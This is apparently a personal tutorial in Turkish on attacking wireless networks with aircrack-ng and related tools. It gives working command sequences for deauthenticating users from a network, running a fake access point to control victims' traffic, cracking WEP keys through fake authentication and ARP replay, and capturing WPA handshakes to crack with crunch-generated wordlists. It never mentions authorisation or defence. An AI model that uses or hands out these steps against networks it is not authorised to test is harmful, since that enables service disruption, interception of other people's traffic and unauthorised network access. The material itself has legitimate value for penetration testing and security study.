## Web Cracking

`sudo apt-get install aircrack-ng` scripti yükler.

`ifconfig` diyip wireless interface ismimizi öğrentikten sonra. `sudo airmon-ng start wlp3s0` verilen interface yi monitor moda alır. `ifconfig` dediğimizde interfacemizin isminin **"wlp3s0mon"** olarak değşitiğini göreceksiniz.

`sudo airmon-ng stop wlp3s0mon` managed moda tekrar geri çevirir.



> Diğer bir yöntem airmon-ng kullanmadan
>
> 
>
> ifconfig wlp3s0 down
>
> iwconfig wlp3s0 mode monitor - monitor moda çevirir.
>
> ifconfig wlp3s0 up
>
> ifconfig wlp3s0 down
>
> iwconfig wlp3s0 mode managed - managed moda çevirir.
>
> ifconfig wlp3s0 up

### airodump-ng ile sniffing / airodump-ng kullanımı

monitor moda altıktan sonra `sudo airodump-ng wlp3s0` diyip başlatabiliriz.

```bash
BSSID - MAC adresi
PWR - Rakam büyüdükçe bize en yakını anlamına gelir ne kadar küçükse okadar uzaktır bizden.
Data - Elimizde olan datalar web crackingde kullanılır.
CH - Channel (kanal) yapılan yayının kanalı.
ENC - Encryption type.
ESSID - Netwokün adıdır. 
```

belirli bir ağa özel airodump-ng çalıştırma temel komut aşağıdaki gibi.

`airodump-ng --channel <channel> --bssid <bssid> --write <çıktı.txt> <interface>` çıktıdaki üst kısım tarama yaptığımız networkün bilgilerini gösterir alt kısımdaki bilgiler ise o ağa bağlı olan cihazların bilgilerini içerir `--write` parametresi - Çıktı isminde birçok dosya uzantısı var .cap uzantılı olan dosyayı wireshark a atarak 
ayrıntılı bilgi toplayabiliriz.

### Deauthentication Attack

Ağa girmeden ağdaki bir hedefin internet bağlantısını kesmek ve ağdan atmak için kullanılan bir saldırı türüdür.

`aireplay-ng --deauth <#packets> -a <AP(Access Point)> <interface>` 

`aireplay-ng --deauth <#packets> -a <AP(Access Point)> -c <target> <interface>` 

Access Point saldıracağımız ağın BSSID si 

Packets integer değer alır. ex: aireplay-ng --deauth 10000

hedefin çok kısa bir sürede bağlantısının kopmasını istiyorsak 5-10 gibi az bir paket sayısı girmemiz gerekir 10000 gibi fazla sayılar kullanırsak sürekli ve uzun süreli bağlantı kopar.

### Fake Access Point

İnternet bağlantımızı yayarak sahte bir Access Point oluşturacağız bağlanan kurbanların internet trafiğini kontrol altına alacağız. Bunun için mana-toolkit scriptini kullanacağız.

`sudo apt-get install mana-toolkit` mana-toolkit configration;

/etc/mana-toolkit/hostapd-mana.conf dosyasını açalım. 

**interface:** wifi_arayüzü 

**ssid:** internetin_adı 

**bssid:** mac 

adresimiz buradan istediğimiz yapılandırmayı yaptıktan sonra kaydedelim.
**/usr/share/mana-toolkit/run-mana/start-nat-simple.sh** dosyasını açalım. 

**upstream:** bağlantıyı aldığımız arayüz 
**phy:** yayın yapacağımız arayüz.

Bu yapılandırmaları yaptıktan sonra.
**bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh** komutunu yazarak sahte Access Pointimizi 
çalıştıralım.



### WEP Cracking

Wifi interfacemizi monitor moda altıktan sonra. airodump-ng ile ağ hakkında bilgi toplayacağız daha sonra aircrack-ng ile parola ele geçirme işlemini yapacağız.

`airodump-ng wlp3s0` - tarama/keşif 

`airodump-ng --channel <channel> --bssid <bssid> --write <çıktı> <interface>`

`aircrack-ng <file_name(çıktı.cap)>`

`aircrack-ng` başarılı sonuç döndürürse **"key found"** yazısını göreriz ve karşısında parola yazar fakat burada dikkat edilecek kısım paroladaki **":"** karakterlerini çıkartıpta girmemiz gerekir asıl parola odur.

### Fake Authentication (Sahte Yetkilendirme)

WEP cracking işlemi yaparken parolasını kırdığımız ağda sürekli bir data akışı olması gerekiyor buyüzden işimize yarayabilecek diğer bir saldırı türüde Fake Authentication. Kendimizi o ağa fake olarak yetkilendireceğiz ve paket yollayacağız (packet injection). `aireplay-ng --fakeauth 0 -a <target_macaddress> -h <host/kali_macaddress> <interface>` 0 paket sayısını belirtir (Yetkilendirme için genelde 0 yeterli olur).

**Association Successful** yazısını görürsek başarılı olmuş demektir.
`aireplay-ng --arpreplay -b <target_macaddress> -h <host/kali_macaddress> <interface> ` sahte yetkilendirme yaptıktan sonra bu komutla paket yollarız ve ağdaki data sayısını arttırırız.

### WPA Cracking

Wifi interfacemizi monitor moda altıktan sonra. airodump-ng ile ağ hakkında bilgi toplayacağız. Burada WEP ten farklı olarak bir handshake yakalammamız gerekiyor modeme bir cihaz bağlandığında 4 lü el sıkışma işlemi gerçekleşir (handshake). Modeme yeni birirnin bağlanmasını bekleyebiliriz yada bir kullanıcıyı ağdan atarak (Deauthentication) tekrar bağlanmasını sağlayabiliriz. WPA Cracking işlemi için wordlist kullanmamız gerekiyor.

`airodump-ng wlp3s0 ` - tarama/keşif

`airodump-ng --channel <channel> --bssid <bssid> --write <çıktı> <interface>`  Ağa üzel bilgi toplama ve bağlı cihazları görme.

`aireplay-ng --deauth <#packets> -a <AP(Access Point)> -c <target> <interface>` Deauthentication

**WPA handshake : <handshake>** handshake yakaladığımızda sağ üst köşede görünür. (çıktı ismindeki dosyanın 
içeriğinde de bulunur :))

> WPA için wordlist oluşturalım bunun için crunch kullanabiliriz.
>
> `crunch <min> <max> <char> -t <pattern> -o <file>`
>
> **pattern:** düzen
>
> **ex:** `crunch 8 10 123!+-*% -t m@@p -o wordlist` 
>
> **ex:** `crunch 8 9 abcdefgh wordlist -o wordlist`
>
> `aircrack-ng <handshake_file> -w <wordlist>`
>
> 